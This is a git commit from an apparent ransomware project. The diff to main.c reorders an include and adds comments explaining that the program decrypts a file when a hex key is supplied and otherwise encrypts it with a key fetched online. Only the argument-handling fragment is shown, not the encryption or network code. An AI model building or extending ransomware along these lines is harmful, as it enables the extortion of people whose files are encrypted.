690fbe22b6521d745e31967e48b853f117a7db67
4zv4l <46655455+4zv4l@users.noreply.github.com>
2021-12-29 08:52:21 +0100

    more comment
    added some comments on how the key is taken depending on the given arguments

--- main.c
+++ main.c
@@ -1,7 +1,7 @@
+#include "src/libcom.h"
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
-#include "src/libcom.h"
 
 void usage() {
 	printf("Usage : ./ransom <file> <key in hex if decrypt>\n");
@@ -17,12 +17,14 @@ int main (int argc, char **argv){
 	}
 	int ID = 0;
 	char* key = 0;
+	// if the key is given then set decryption mode
 	if(argc == 3){
 		ENCRYPT = 0;
 		key = malloc(LENGTH);
 		char *hex_key = argv[2];
 		hexa_to_bytes(hex_key, (unsigned char*)key, LENGTH);
 	}
+	// else keep encryption mode and get the key online
 	else{
 		key = getKey(ID);
 	}
